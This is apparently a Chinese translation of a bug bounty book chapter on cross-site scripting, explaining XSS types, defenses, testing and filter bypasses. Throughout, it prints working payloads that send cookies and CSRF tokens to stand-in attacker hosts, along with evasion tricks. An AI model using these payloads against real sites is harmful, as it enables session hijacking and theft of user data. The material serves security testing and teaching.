# 第6章：跨站脚本（Cross-Site Scripting）

让我们从跨站脚本（XSS）开始，这是漏洞赏金计划中最常报告的漏洞之一。它的普遍程度如此之高，以至于年复一年地出现在 OWASP 的 Web 应用十大安全风险列表中。它也是 HackerOne 上报告最多的漏洞，仅 2020 年就支付了超过 400 万美元的赏金。

当攻击者能够在受害者浏览器中执行自定义脚本时，就会产生 XSS 漏洞。如果应用程序无法区分用户输入与构成网页的合法代码，攻击者就可以将自己的代码注入到其他用户访问的页面中。受害者的浏览器随后会执行恶意脚本，这些脚本可能窃取 Cookie、泄露个人信息、更改页面内容或将用户重定向到恶意网站。这些恶意脚本通常是 JavaScript 代码，但也可以是 HTML、Flash、VBScript 或任何浏览器可执行语言编写的代码。

在本章中，我们将深入探讨什么是 XSS 漏洞、如何利用它们以及如何绕过常见防护措施。我们还将讨论发现 XSS 后如何提升攻击影响。

## 机制

在 XSS 攻击中，攻击者将可执行脚本注入用户查看的 HTML 页面中。这意味着要理解 XSS，你首先需要了解 JavaScript 和 HTML 语法。

网页由 HTML 代码构成，这些代码描述了页面的结构和内容。例如，`<h1>` 标签定义网页标题，`<p>` 标签表示段落文本。标签使用对应的闭合标签（如 `</h1>` 和 `</p>`）来指示元素内容的结束位置。为了理解其工作原理，请将以下代码保存为 `test.html`：

```html
<html>
<h1>Welcome to my web page.</h1>
<p>Thanks for visiting!</p>
</html>
```

然后用浏览器打开它（右键点击文件 → 打开方式 → 选择浏览器，或直接将文件拖入浏览器窗口）。你将看到一个简单的网页，如图 6-1 所示。

*（图 6-1：在浏览器中渲染的简单 HTML 页面）*

除了格式化文本，HTML 还允许使用 `<img>` 标签嵌入图片、`<form>` 标签创建用户输入表单、`<a>` 标签链接到外部页面等。本章不会完整介绍 HTML 编写教程，但你可以参考 W3School 的教程（https://www.w3schools.com/html/default.asp）。

HTML 还允许使用 `<script>` 标签在 HTML 文档中包含可执行脚本。网站利用这些脚本来控制客户端应用逻辑，使网站具有交互性。例如，以下脚本会在网页上生成一个 “Hello!” 弹窗：

```html
<html>
<script>alert("Hello!");</script>
<h1>Welcome to my web page!</h1>
<p>Thanks for visiting!</p>
</html>
```

像这样直接嵌入 HTML 文件中而非从外部文件加载的脚本称为**内联脚本**。这些脚本是许多 XSS 漏洞的根源。（除了作为内联脚本嵌入，站点也可以像这样加载外部 JavaScript 文件：`<script src="URL_OF_EXTERNAL_SCRIPT"></script>`。）

为了说明原因，假设我们的站点包含一个允许访客订阅新闻通讯的 HTML 表单（图 6-2）。

*（图 6-2：带有 HTML 表单的页面）*

页面的源 HTML 代码如下：

```html
<h1>Welcome to my site.</h1>
<h3>This is a cybersecurity newsletter that focuses on bug bounty
news and write-ups. Please subscribe to my newsletter below to
receive new cybersecurity articles in your email inbox.</h3>
<form action="/subscribe" method="post">
  <label for="email">Email:</label><br>
  <input type="text" id="email" value="Please enter your email.">
  <br><br>
  <input type="submit" value="Submit">
</form>
```

访客输入邮箱后，网站会显示确认信息（图 6-3）。

*（图 6-3：订阅后的确认消息）*

生成确认消息的 HTML 如下（`<b>` 标签表示粗体文本）：

```html
<p>Thanks! You have subscribed <b>vickie@gmail.com</b> to the newsletter.</p>
```

页面通过用户输入构造消息。那么，如果用户输入的不是邮箱地址而是一个脚本呢？例如，一个设置页面位置的脚本会使浏览器重定向到指定位置：

```html
<script>location="http://attacker.com";</script>
```

攻击者可以将此脚本输入邮箱字段并点击提交（图 6-4）。

*（图 6-4：攻击者在输入字段中输入脚本而非邮箱）*

如果网站未对用户输入进行验证或清理，就直接构造确认消息，那么页面源代码将变成：

```html
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</script></b> to the newsletter.</p>
```

**验证用户输入**是指应用程序检查用户输入是否符合某种标准（例如不包含恶意 JavaScript 代码）。**清理用户输入**则是指应用程序在处理之前修改输入中可能干扰 HTML 逻辑的特殊字符。

结果，内联脚本会导致页面重定向到 attacker.com。当攻击者能够以这种方式将脚本注入其他用户正在查看的页面时，就发生了 XSS。攻击者也可以使用不同语法嵌入恶意代码。HTML `<script>` 标签的 `src` 属性允许从外部来源加载 JavaScript。以下恶意代码在 XSS 攻击中会令受害者浏览器执行 `http://attacker.com/xss.js` 的内容：

```html
<script src=http://attacker.com/xss.js></script>
```

不过这个例子实际上并不可利用，因为攻击者无法将恶意脚本注入其他用户的页面，最多只能重定向自己。但假设该站点还允许用户通过访问 URL `https://subscribe.example.com?email=SUBSCRIBER_EMAIL` 来订阅。用户访问该 URL 后会被自动订阅，并在页面上显示同样的确认信息。此时攻击者可以通过诱骗用户访问恶意 URL 来注入脚本：

```
https://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

由于恶意脚本被嵌入页面，受害者浏览器会认为该脚本属于该站点。于是注入的脚本可以访问浏览器为该站点存储的任何资源，包括 Cookie 和会话令牌。因此，攻击者可以利用这些脚本窃取信息并绕过访问控制。例如，攻击者可以通过让受害者浏览器向攻击者 IP 发送请求（将受害者 Cookie 作为 URL 参数）来窃取 Cookie：

```html
<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

该脚本包含 JavaScript 代码，用于从攻击者服务器加载一张图片，并将用户 Cookie 作为请求的一部分。浏览器会向攻击者 IP 发送 GET 请求，URL 参数 `c`（代表 cookie）包含当前站点下受害用户的 `document.cookie`。这样，攻击者通过检查服务器日志中的传入请求，即可窃取其他用户的 Cookie。注意，如果会话 Cookie 设置了 `HttpOnly` 标志，JavaScript 将无法读取该 Cookie，因此攻击者无法外泄它。不过，XSS 仍可用于以受害者身份执行操作、修改受害者正在查看的网页，以及读取受害者的敏感信息（如 CSRF 令牌、信用卡号以及页面中渲染的任何其他内容）。

## XSS 的类型

XSS 有三种类型：存储型 XSS、反射型 XSS 和 DOM 型 XSS。它们的区别在于 XSS 载荷在传递给受害者之前是如何传播的。此外，还有一些特殊类别：盲 XSS 和自 XSS，我们稍后会谈到。

### 存储型 XSS

存储型 XSS 发生在用户输入被存储在服务器上并以不安全的方式检索时。当应用程序接受用户输入而不进行验证，将其存储在服务器中，然后不经清理就直接在用户浏览器中渲染时，恶意 JavaScript 代码就可能进入数据库并最终到达受害者浏览器。

存储型 XSS 是本章讨论的最严重的 XSS 类型，因为它可能比反射型、DOM 型或自 XSS 影响更多用户。有时在存储型 XSS 攻击中，用户只需查看嵌入了载荷的页面就会成为受害者，而反射型和 DOM XSS 通常需要用户点击恶意链接。最后，自 XSS 需要大量社会工程学才能成功。

在存储型 XSS 攻击中，攻击者设法将恶意脚本永久保存在目标应用的服务器上，供其他人访问。也许他们能将脚本注入应用程序的用户数据库，也可能注入服务器日志、留言板或评论字段。每当用户访问存储的信息时，XSS 就会在其浏览器中执行。

例如，假设某互联网论坛的评论字段存在 XSS 漏洞。当用户对博客文章提交评论时，该用户输入在呈现给任何查看该博客文章的人之前，未经任何验证或清理。攻击者可以提交包含 JavaScript 代码的评论，让任何查看该博客文章的用户执行该代码！

XSS 的一个很好的概念验证是在浏览器中通过注入的 JavaScript 代码生成一个警告框，我们来试试。JavaScript 代码 `alert('XSS by Vickie')` 会在受害者浏览器中生成一个显示 “XSS by Vickie” 的弹窗：

```html
<script>alert('XSS by Vickie');</script>
```

如果提交成功，此消息将嵌入论坛页面的 HTML 代码中，并显示给所有查看该评论的访客：

```html
<h2>Vickie's message</h2>
<p>What a great post! Thanks for sharing.</p>
<h2>Attacker's message</h2>
<p><script>alert('XSS by Vickie');</script></p>
```

图 6-5 显示了两条消息在浏览器中的渲染效果。

*（图 6-5：两条消息在浏览器中渲染，攻击者的消息显示为空白，因为浏览器将其解释为脚本而非文本）*

当你在浏览器中加载该 HTML 页面时，攻击者的评论区域会显示为空白，因为浏览器将 `<p>` 标签内的 `<script>alert('XSS by Vickie');</script>` 解释为脚本而非普通文本。你应该会看到一个显示 “XSS by Vickie” 的弹窗。

每次用户查看该论坛评论时，其浏览器都会执行嵌入的 JavaScript。存储型 XSS 通常最危险，因为攻击者可以通过单个载荷攻击大量受害者。

### 盲 XSS

盲 XSS 漏洞是一种存储型 XSS，其恶意输入被服务器存储，并在应用程序的另一部分或另一个你看不到的应用程序中执行。

例如，假设 example.com 上有一个页面允许你向站点支持人员发送消息。当用户提交消息时，该输入在呈现给站点管理员页面之前未经任何验证或清理。攻击者可以提交包含 JavaScript 代码的消息，让任何查看该消息的管理员执行该代码。

这些 XSS 漏洞更难检测，因为你无法通过查看服务器响应中的反射输入来发现它们，但它们的危险程度与常规存储型 XSS 相当。盲 XSS 常被用于攻击管理员、窃取其数据并入侵其账户。

### 反射型 XSS

反射型 XSS 漏洞发生在用户输入未经数据库存储而直接返回给用户时。应用程序接收用户输入，在服务器端处理，并立即将其返回给用户。

我之前展示的电子邮件表单示例就是一个反射型 XSS 攻击。这类问题通常发生在服务器依赖用户输入构建显示搜索结果或错误消息的页面时。例如，假设某个站点具有搜索功能。用户可以通过 URL 参数输入搜索词，页面会在结果页顶部显示包含该搜索词的消息。如果用户搜索 `abc`，相关消息的源代码可能如下：

```html
<h2>You searched for abc; here are the results!</h2>
```

如果搜索功能在结果页上显示任何用户提交的搜索字符串，那么如下搜索词会导致脚本嵌入结果页面并被浏览器执行：

```
https://example.com/search?q=<script>alert('XSS by Vickie');</script>
```

如果攻击者能诱骗受害者访问此 URL，载荷就会嵌入到他们的页面版本中，使受害者浏览器运行攻击者想要的任何代码。与存储型 XSS（允许攻击者对任何访问其存储资源的人执行代码）不同，反射型 XSS 只能对点击恶意链接的受害者执行代码。

### DOM 型 XSS

DOM 型 XSS 与反射型 XSS 类似，但区别在于用户输入从未离开过用户浏览器。在 DOM 型 XSS 中，应用程序接收用户输入，在受害者浏览器中处理，然后返回给用户。

**文档对象模型（DOM）** 是浏览器用于渲染网页的模型。DOM 表示网页的结构，定义每个 HTML 元素的基本属性和行为，并帮助脚本访问和修改页面内容。DOM 型 XSS 直接针对网页的 DOM：它攻击客户端的本地页面副本，而不经过服务器。当页面接收用户提供的数据并根据该输入动态更改 DOM 时，攻击者就能攻击 DOM。像 jQuery 这样的 JavaScript 库容易受到 DOM 型 XSS 的影响，因为它们会动态更改 DOM 元素。

与反射型 XSS 类似，攻击者通过受害者用户输入提交 DOM 型 XSS 载荷。但与反射型 XSS 不同的是，DOM 型 XSS 脚本不需要服务器参与，因为它在用户输入直接修改浏览器中页面源代码时执行。XSS 脚本从未发送到服务器，因此服务器的 HTTP 响应不会改变。

这可能听起来有些抽象，我们来看一个例子。假设一个网站允许用户通过 URL 参数提交地区（locale）：

```
https://example.com?locale=north_america
```

网页的客户端代码会使用该地区构造欢迎消息，其 HTML 如下：

```html
<h2>Welcome, user from north america!</h2>
```

该 URL 参数不会提交给服务器，而是由用户浏览器通过客户端脚本在本地用于构建网页。但如果网站未验证用户提交的地区参数，攻击者可以诱骗用户访问如下 URL：

```
https://example.com?locale=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>
```

站点会将载荷嵌入用户网页，受害者浏览器将执行恶意脚本。

DOM XSS 初听起来可能与反射型 XSS 很像。区别在于反射型 XSS 的载荷会发送到服务器，并在 HTTP 响应中返回给用户浏览器。而 DOM XSS 的载荷是因为客户端代码不安全地渲染用户输入而被注入页面。虽然两种攻击的结果类似，但测试和防御的过程不同。

导致反射型和 DOM XSS 的用户输入字段并不总是 URL 参数，有时也出现在 URL 片段（fragment）或路径名中。URL 片段是位于 URL 末尾、以 `#` 开头的字符串，通常用于自动将用户引导到页面内的某个部分或传递附加信息。例如，以下 URL 包含一个片段，将用户带到站点主页的 `#about_us` 部分：

```
https://example.com#about_us
```

我们将在第 7 章详细讨论 URL 的组成部分。有关 DOM XSS 及其示例载荷的更多信息，请参阅 PortSwigger 的文章 “DOM-Based XSS”：https://portswigger.net/web-security/cross-site-scripting/dom-based/。

### 自 XSS

自 XSS 攻击需要受害者自己输入恶意载荷。要执行这类攻击，攻击者必须诱骗用户做比仅仅查看页面或访问某个 URL 更多的事情。

例如，假设用户仪表板上的某个字段存在存储型 XSS 漏洞。但由于只有受害者自己可以看到和编辑该字段，攻击者无法直接投放载荷，除非能诱骗受害者将该字段的值更改为 XSS 载荷。

如果你曾在社交媒体或短信中看到过让你将一段代码粘贴到浏览器中 “做点酷事” 的消息，那很可能是攻击代码，目的是诱骗你对自己发起自 XSS 攻击。攻击者通常将恶意载荷（通常通过 bitly.com 等短链接隐藏）嵌入一段看起来很复杂的代码中，并利用社交媒体欺骗不知情用户攻击自己。

在漏洞赏金中，自 XSS 漏洞通常不被接受为有效提交，因为它们需要社会工程学。需要社会工程学（即操纵受害者）的漏洞通常不被漏洞赏金计划接受，因为它们不是纯粹的技术问题。

## 防御措施

为了防止 XSS，应用程序应实施两种控制：健全的输入验证和上下文相关的输出转义与编码。应用程序绝不应直接将用户提交的数据插入 HTML 文档——包括插入 `<script>` 标签、HTML 标签名称或属性名称内部。相反，服务器应验证用户提交的输入不包含可能影响浏览器解释页面信息的危险字符。例如，包含字符串 `<script>` 的用户输入是 XSS 载荷的良好指示。在这种情况下，服务器可以阻止该请求，或通过移除或转义特殊字符来清理它，然后再进一步处理。

**转义** 是指对特殊字符进行编码，使其被程序或机器按字面意思解释，而不是作为特殊字符处理。字符的编码方式有多种。应用程序需要根据用户输入将被嵌入的位置进行编码。如果用户输入插入到 `<script>` 标签中，则需要以 JavaScript 格式进行编码。插入到 HTML、XML、JSON 和 CSS 文件中的输入也同样处理。

在我们示例的上下文中，应用程序需要将特殊字符编码为 HTML 文档使用的格式。例如，左尖括号和右尖括号可以编码为 HTML 字符 `&lt;` 和 `&gt;`。为防止 XSS，应用程序应转义在 HTML 中具有特殊含义的字符，如 `&` 符号、尖括号 `<` 和 `>`、单引号和双引号以及正斜杠。

转义可确保浏览器不会将这些字符误认为可执行代码。这是大多数现代应用程序为防范 XSS 所做的操作。应用程序应对每一段将要被用户浏览器渲染或访问的用户输入执行此操作。许多现代 JavaScript 框架（如 React、Angular 2+ 和 Vue.js）会自动为你执行此操作，因此选择合适的 JavaScript 框架可以防止许多 XSS 漏洞。

DOM 型 XSS 的防御需要不同的方法。由于恶意用户输入不会经过服务器，因此对进入和离开服务器的数据进行清理无效。相反，应用程序应避免根据用户输入重写 HTML 文档的代码，并且应在数据插入 DOM 之前实现客户端输入验证。

你还可以采取措施减轻 XSS 漏洞发生后的影响。首先，可以为站点使用的敏感 Cookie 设置 `HttpOnly` 标志，防止攻击者通过 XSS 窃取这些 Cookie。还应实施 Content-Security-Policy HTTP 响应头。该头允许你限制网页上加载资源（如 JavaScript、CSS 或图片）的方式。为防止 XSS，你可以指示浏览器仅执行来自指定来源列表的脚本。有关防止 XSS 攻击的更多信息，请访问 OWASP XSS 防御速查表：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html。

## 寻找 XSS

在用户输入被渲染到页面的地方寻找 XSS。不同 XSS 类型的查找过程有所不同，但核心原则相同：检查反射的用户输入。

在本节中，我们将在 Web 应用程序中寻找 XSS。但请记住，XSS 漏洞也可能出现在常规 Web 应用之外。你可以在通过非 HTTP 协议（如 SMTP、SNMP 和 DNS）通信的应用程序中寻找 XSS。有时，电子邮件应用和其他桌面应用等商业软件会接收来自这些协议的数据。如果你对这些技术感兴趣，可以查看 Offensive Security 的 Advanced Web Attacks and Exploitation 培训：https://www.offensive-security.com/awae-oswe/。

在开始寻找任何漏洞之前，最好准备好 Burp Suite 或你喜欢的代理工具。确保已配置代理以配合浏览器使用。相关说明请参见第 4 章。

### 第 1 步：寻找输入机会

首先，寻找向目标站点提交用户输入的机会。如果你在测试存储型 XSS，请搜索输入被服务器存储并稍后显示给用户的地方，包括评论字段、用户个人资料和博客文章。最常被反射回给用户的输入类型是表单、搜索框以及注册时的姓名和用户名字段。

不要仅限于文本输入字段。有时下拉菜单或数字字段也可能允许你执行 XSS，因为即使你无法在浏览器中输入载荷，代理也可能允许你将其直接插入请求中。为此，你可以开启代理的流量拦截功能，并在将请求转发到服务器之前修改它。例如，假设网页上的某个用户输入字段似乎只接受数值，如 POST 请求中的 age 参数：

```
POST /edit_user_age
(Post request body)
age=20
```

你仍然可以通过代理拦截请求并更改输入值来尝试提交 XSS 载荷：

```
POST /edit_user_age
(Post request body)
age=<script>alert('XSS by Vickie');</script>
```

如果你想找到反射型和 DOM XSS，请查找显示给用户的 URL 参数、片段或路径名中的用户输入。一个好方法是在每个 URL 参数中插入一个自定义字符串，并检查它是否出现在返回的页面中。使该字符串足够独特，以便你确定看到的就是你的输入导致的。例如，我喜欢使用字符串 “XSS_BY_VICKIE”。将自定义字符串插入你能找到的每个用户输入机会。然后，当你在浏览器中查看页面时，通过查看页面源代码（右键点击页面选择 “查看源代码”）并使用浏览器的页面搜索功能（通常按 Ctrl-F）搜索该字符串。这可以让你了解哪些用户输入字段出现在生成的网页中。

### 第 2 步：插入载荷

一旦识别出应用程序中的用户输入机会，你就可以开始在发现的注入点输入测试 XSS 载荷。最简单的测试载荷是警告框：

```html
<script>alert('XSS by Vickie');</script>
```

如果攻击成功，你应该会在页面上看到显示 “XSS by Vickie” 的弹窗。

但除了最缺乏防护的应用外，这个载荷在典型 Web 应用中不会生效，因为如今大多数网站都对输入字段实施了某种 XSS 保护。这种简单载荷更可能在不使用最新框架的 IoT 或嵌入式应用中生效。如果你对 IoT 漏洞感兴趣，可以查看 OWASP 的 IoTGoat 项目：https://github.com/OWASP/IoTGoat/。随着 XSS 防御变得越来越先进，绕过这些防御的 XSS 载荷也变得越来越复杂。

### 不仅仅是 `<script>` 标签

将 `<script>` 标签插入受害者网页并不是在受害者浏览器中执行脚本的唯一方法。还有其他几种技巧。

首先，你可以更改 HTML 标签中属性的值。某些 HTML 属性允许你在特定条件满足时指定要运行的脚本。例如，`onload` 事件属性在 HTML 元素加载完成后运行指定脚本：

```html
<img onload=alert('The image has been loaded!') src="example.png">
```

类似地，`onclick` 事件属性指定元素被点击时执行的脚本，`onerror` 指定加载元素出错时运行的脚本。如果你能将代码插入这些属性，甚至向 HTML 标签添加新的事件属性，就可以创建 XSS。

另一种实现 XSS 的方式是通过特殊 URL 方案，如 `javascript:` 和 `data:`。`javascript:` URL 方案允许你执行 URL 中指定的 JavaScript 代码。例如，输入以下 URL 会生成一个显示 “XSS by Vickie” 的警告框：

```
javascript:alert('XSS by Vickie')
```

这意味着如果你能让用户加载 `javascript:` URL，同样可以实现 XSS。数据 URL（使用 `data:` 方案的 URL）允许你在 URL 中嵌入小文件。你也可以用它们将 JavaScript 代码嵌入 URL：

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+
```

该 URL 也会生成警告框，因为数据 URL 中包含的数据是以下脚本的 base64 编码版本：

```html
<script>alert('XSS by Vickie')</script>
```

`data:` URL 中包含的文档不一定需要 base64 编码。例如，你可以直接将 JavaScript 嵌入 URL，如下所示，但 base64 编码通常有助于绕过 XSS 过滤器：

```
data:text/html,<script>alert('XSS by Vickie')</script>
```

当站点允许用户输入 URL 时，你可以利用这些 URL 触发 XSS。例如，站点可能允许用户通过 URL 加载图片并将其用作个人资料头像：

```
https://example.com/upload_profile_pic?url=IMAGE_URL
```

应用程序随后会通过将 URL 插入 `<img>` 标签在网页上呈现预览。如果你插入 JavaScript 或数据 URL，就可以诱骗受害者浏览器加载你的 JavaScript 代码：

```html
<img src="IMAGE_URL"/>
```

还有更多执行 JavaScript 代码以绕过 XSS 保护的方式。你可以在 PortSwigger 上找到更多示例载荷：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/。不同浏览器也支持不同的标签和事件处理器，因此在寻找 XSS 时，应始终使用多个浏览器进行测试。

### 闭合 HTML 标签

插入 XSS 载荷时，通常需要闭合之前的 HTML 标签，包括其闭合尖括号。当你将用户输入放在一个 HTML 元素内部，但想使用另一个 HTML 元素运行 JavaScript 时，这是必要的。你必须先完成前一个标签，才能开始新标签，以避免语法错误。否则，浏览器将无法正确解释你的载荷。例如，如果你将输入插入 `<img>` 标签，则需要先闭合 `<img>` 标签，然后才能开始 `<script>` 标签。以下是带有用户输入占位符的原始 `<img>` 标签：

```html
<img src="USER_INPUT">
```

要闭合该标签，你的载荷必须包含在 JavaScript 之前闭合 `<img>` 标签的部分。载荷可能如下所示：

```
"/><script>location="http://attacker.com";</script>
```

当注入到 `<img>` 标签时，生成的 HTML 如下（注入部分以粗体表示）：

```html
<img src=""/><script>location="http://attacker.com";</script>">
```

该载荷通过提供双引号来闭合原本应包含用户输入的字符串，然后用 `/>` 闭合 `<img>` 标签。最后，在 `<img>` 标签之后注入完整的脚本标签。

如果你的载荷不起作用，可以检查返回的文档中是否因载荷导致语法错误。你可以在代理中检查返回的文档，查找未闭合标签或其他语法问题。也可以打开浏览器的开发者控制台，查看页面加载时是否有错误。在 Firefox 中，右键点击页面选择 “检查元素” → “控制台” 即可打开控制台。

你可以在网上找到更多常见的 XSS 载荷。表 6-1 列出了一些示例。

**表 6-1：常见 XSS 载荷**

| 载荷 | 用途 |
|------|------|
| `<script>alert(1)</script>` | 最通用的 XSS 载荷，成功时生成弹窗 |
| `<iframe src=javascript:alert(1)>` | 在 iframe 中加载 JavaScript 代码，当 `<script>` 标签被禁止时有用 |
| `<body onload=alert(1)>` | 当输入字符串不能包含 “script” 时有用，插入一个加载后自动运行 JavaScript 的 HTML 元素 |
| `"><img src=x onerror=prompt(1);>` | 闭合前一个标签，注入一个无效源 URL 的 `<img>` 标签，加载失败时执行 `onerror` 中的 JavaScript |
| `<script>alert(1)<!--` | `<!--` 是 HTML 注释的开始，注释掉文档剩余部分以防止语法错误 |
| `<a onmouseover="alert(1)">test</a>` | 插入一个链接，当用户鼠标悬停时执行 JavaScript |

黑客们还设计了许多更有创意的载荷。在线搜索 “XSS payloads” 可获得更多灵感。不过，拿一长串载荷逐一尝试可能耗时且低效。另一种手动 XSS 测试方法是插入 **XSS polyglot**（多语言载荷），这种载荷能在多种上下文中执行。例如，无论插入 `<img>` 标签、`<script>` 标签还是通用 `<p>` 标签，它都能执行，并且可以绕过某些 XSS 过滤器。看看 EdOverflow 发布的这个 polyglot 载荷（https://polyglot.innerht.ml/）：

```
javascript:"/*\"/**`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

该载荷的细节超出了本书范围，但它包含了多种创建 XSS 的方式——如果一种方法失败，另一种仍能触发 XSS。

另一种更高效的测试方法是使用通用测试字符串而非完整 XSS 载荷。插入一串 XSS 载荷中常用的特殊 HTML 字符，例如：`>'<"//:=;!--`。注意哪些字符被应用程序转义，哪些直接渲染。然后，你可以根据已知应用程序未正确清理的字符来构造测试 XSS 载荷。

盲 XSS 漏洞更难检测，因为你无法通过查找反射输入来发现它们，因此无法通过尝试生成警告框来测试。相反，尝试让受害者浏览器向你拥有的服务器发出请求。例如，你可以提交以下载荷，它会使受害者浏览器请求你服务器上的 `/xss` 页面：

```html
<script src='http://YOUR_SERVER_IP/xss'></script>
```

然后监控服务器日志，看是否有人请求该页面。如果你看到对路径 `/xss` 的请求，说明盲 XSS 已被触发！像 XSS Hunter（https://xsshunter.com/features）这样的工具可以自动化这个过程。我们将在第 13 章中进一步讨论设置服务器以测试多种漏洞类型。

最后，虽然黑客通常手动发现新的 XSS 向量，但通过模糊测试自动检测已知 XSS 向量也是一种好方法。我们将在第 25 章讨论模糊测试和自动漏洞发现。

### 第 3 步：确认影响

检查目标页面上是否存在你的载荷。如果你使用了 `alert` 函数，页面是否生成了弹窗？如果你使用了 `location` 载荷，浏览器是否将你重定向到站外？

请注意，站点也可能使用用户输入来构建其他内容，而不仅仅是下一个返回的网页。你的输入可能会出现在未来的网页、电子邮件和文件门户中。另外，载荷提交与用户输入渲染之间可能存在时间延迟。这种情况常见于日志文件和分析页面。如果你针对这些，载荷可能不会立即执行，或者会在其他用户账户中执行。某些 XSS 载荷仅在特定上下文中执行，例如管理员登录时，或用户主动点击或悬停在某些 HTML 元素上时。通过访问必要页面并执行那些操作，确认 XSS 载荷的影响。

## 绕过 XSS 防护

如今大多数应用程序都在输入字段中实现了某种 XSS 保护。它们通常使用黑名单来过滤掉可能指示 XSS 的危险表达式。以下是一些绕过此类保护的方法。

### 替代 JavaScript 语法

应用程序通常会清理用户输入中的 `<script>` 标签。如果是这样，尝试执行不使用 `<script>` 标签的 XSS。例如，在某些情况下，你可以在其他类型的标签中指定要运行的 JavaScript。构造 XSS 载荷时，也可以尝试将代码插入 HTML 标签名称或属性中。假设用户输入被传递给 HTML 图片标签，如下所示：

```html
<img src="USER_INPUT">
```

除了闭合图片标签并插入脚本标签：

```html
<img src="/><script>alert('XSS by Vickie');</script>"/>
```

你可以直接将 JavaScript 代码作为当前标签的属性插入：

```html
<img src="123" onerror="alert('XSS by Vickie');"/>
```

另一种不使用 `<script>` 标签注入代码的方式是使用前面提到的特殊 URL 方案。以下片段会创建一个 “Click me!” 链接，点击时生成警告框：

```html
<a href="javascript:alert('XSS by Vickie')">Click me!</a>
```

### 大小写与编码

你还可以混合使用不同编码和大小写来迷惑 XSS 过滤器。例如，如果过滤器只过滤字符串 “script”，可以在载荷中将某些字母大写。由于浏览器解析 HTML 时通常很宽容，允许较小的语法问题（如大小写），这不会影响脚本标签的解释：

```html
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```

如果应用程序过滤特殊 HTML 字符（如单引号和双引号），你就无法直接在 XSS 载荷中编写字符串。但你可以尝试使用 JavaScript 的 `fromCharCode()` 函数，它将数字代码映射到对应的 ASCII 字符，从而创建你需要的字符串。例如，以下代码等同于字符串 `"http://attacker_server_ip/?c="`：

```javascript
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```

这意味着你可以构造不带引号的 XSS 载荷，如下所示：

```html
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

`String.fromCharCode()` 函数在给定 ASCII 字符代码列表后返回一个字符串。你可以使用在线 JavaScript 编辑器（如 https://js.do/）运行 JavaScript 代码，或将其保存为 HTML 文件并在浏览器中加载，从而将你的攻击字符串转换为 ASCII 数字序列：

```html
<script>
  function ascii(c) {
    return c.charCodeAt();
  }
  encoded = "INPUT_STRING".split("").map(ascii);
  document.write(encoded);
</script>
```

`ascii()` 函数 ① 将字符转换为对应的 ASCII 数字表示。我们将输入字符串中的每个字符通过 `ascii()` ② 运行。最后，我们将转换后的字符串写入文档 ③。让我们用此代码转换载荷 `http://attacker_server_ip/?c=`：

```html
<script>
  function ascii(c) {
    return c.charCodeAt();
  }
  encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
  document.write(encoded);
</script>
```

此 JavaScript 代码应输出 `"104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61"`。然后你可以使用 `fromCharCode()` 方法构造载荷。

### 过滤器逻辑错误

最后，你可以利用过滤器逻辑中的错误。例如，有时应用程序会移除用户输入中的所有 `<script>` 标签以防止 XSS，但只执行一次。如果是这样，你可以使用如下载荷：

```html
<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>
```

注意每个 `<script>` 标签将另一个 `<script>` 标签一分为二。过滤器不会将这些不完整的标签识别为合法标签，但一旦过滤器从该载荷中移除完整的标签，渲染后的输入就变成了一段完全有效的 JavaScript 代码：

```html
<script>location='http://attacker_server_ip/c='+document.cookie;</script>
```

这些只是你可以尝试的几种过滤器绕过技术。XSS 防护很难做到正确，而黑客们不断提出新技术来绕过防护。这就是为什么黑客们仍在野外不断发现和利用 XSS 问题。更多过滤器绕过思路，请查看 OWASP 的 XSS 过滤器规避速查表：https://owasp.org/www-community/xss-filter-evasion-cheatsheet。你也可以直接搜索 “XSS filter bypass” 查找更多有趣文章。

## 提升攻击影响

XSS 的影响因多种因素而异。例如，XSS 的类型决定了可能受影响的用户数量。公共论坛上的存储型 XSS 可以实际攻击任何访问该论坛页面的用户，因此存储型 XSS 被认为最为严重。另一方面，反射型或 DOM XSS 仅影响点击恶意链接的用户，而自 XSS 需要大量用户交互和社会工程学才能执行，因此通常被认为影响较低。

受影响用户的身份也很重要。假设站点服务器日志中存在存储型 XSS 漏洞，该 XSS 可能影响系统管理员，并允许攻击者接管他们的会话。由于受影响的是高权限账户，该 XSS 可能危及整个应用程序的完整性。你可能获得客户数据、内部文件和 API 密钥的访问权限，甚至可能通过上传 shell 或以管理员身份执行脚本将攻击升级为 RCE。

如果受影响的是普通用户群体，XSS 允许攻击者窃取 Cookie 和会话令牌等私有数据，从而劫持任何用户的会话并接管相关账户。

大多数情况下，XSS 可用于读取受害者页面上的敏感信息。由于 XSS 攻击期间执行的脚本以目标页面的上下文运行，因此该脚本可以访问页面上的任何信息。这意味着你可以利用 XSS 窃取数据并由此升级攻击。可以通过运行将数据发送回给你的脚本来实现。例如，以下代码片段读取受害者页面上嵌入的 CSRF 令牌，并将其作为名为 `token` 的 URL 参数发送到攻击者服务器。如果你能窃取用户的 CSRF 令牌，就可以利用这些令牌绕过 CSRF 保护，以该用户身份执行操作（更多信息请参见第 9 章关于 CSRF 的内容）。

```javascript
var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
xhr.send(null);
```

